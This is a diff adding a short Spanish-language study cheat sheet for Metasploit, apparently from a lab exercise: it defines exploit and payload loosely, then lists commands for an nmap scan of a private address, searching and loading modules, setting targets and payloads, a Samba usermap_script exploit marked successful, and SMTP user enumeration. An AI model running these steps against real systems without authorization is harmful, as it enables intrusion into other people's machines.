@@ -1,0 +1,41 @@
+Un exploit es una vulnerabilidad, y el payload es la carga 
+que se ejecuta en esa vulnerabilidad, es ecir, 
+la carga que activamos a la hora de aprovechar dicha vulmerabilidad.
+
+db_nmap -sS -sV -O 10.110.0.163
+host
+services
+search "service" --> ej: search UnrealIRCd
+tambn se puede filtrar --> search nfs type:exploit platform:linux
+use 0
+show options
+set rhosts
+set rport
+show payloads
+set payload 0
+exploit
+
+----------------------------------
+workspace -a Marco--> crear
+sessions -l --> sesiones activas
+set session 1 
+exploit
+
+info -d --> información del exploit
+back --> salir del módulo o del exploit
+ctrl + c
+help --> ayuda de comandos
+show info
+
+--1--EXITOSO
+search usermap_script
+use 0
+set RHOSTS 10....
+exploit
+
+--2-- NI IDEA
+use auxiliary/scanner/smtp/smtp_enum
+show options
+set RHOSTS 10....
+run
+run
